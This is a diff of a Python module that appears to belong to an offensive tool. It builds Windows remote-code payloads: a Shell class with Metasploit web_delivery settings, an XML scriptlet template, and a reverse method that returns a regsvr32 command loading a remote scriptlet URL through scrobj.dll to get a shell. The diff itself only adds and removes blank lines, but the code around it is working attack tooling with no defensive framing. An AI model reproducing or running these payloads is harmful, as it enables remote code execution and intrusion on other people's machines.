@@ -1,6 +1,7 @@
 # encoding: utf8
 from .config import *
 
+
 class Shell:
     def __init__(self):
         self.info = {
@@ -19,7 +20,6 @@ msf5 exploit(multi/script/web_delivery)
 
 """.format(lhost, port_msf)
 
-
         self.vbs = """
 <?XML version="1.0"?>
 <scriptlet>
@@ -30,7 +30,6 @@ msf5 exploit(multi/script/web_delivery)
     </registration>
 </scriptlet>
 """
-
 
     def reverse(self, url):
         return "regsvr32 /s /n /u /i:{0} scrobj.dll".format(url)
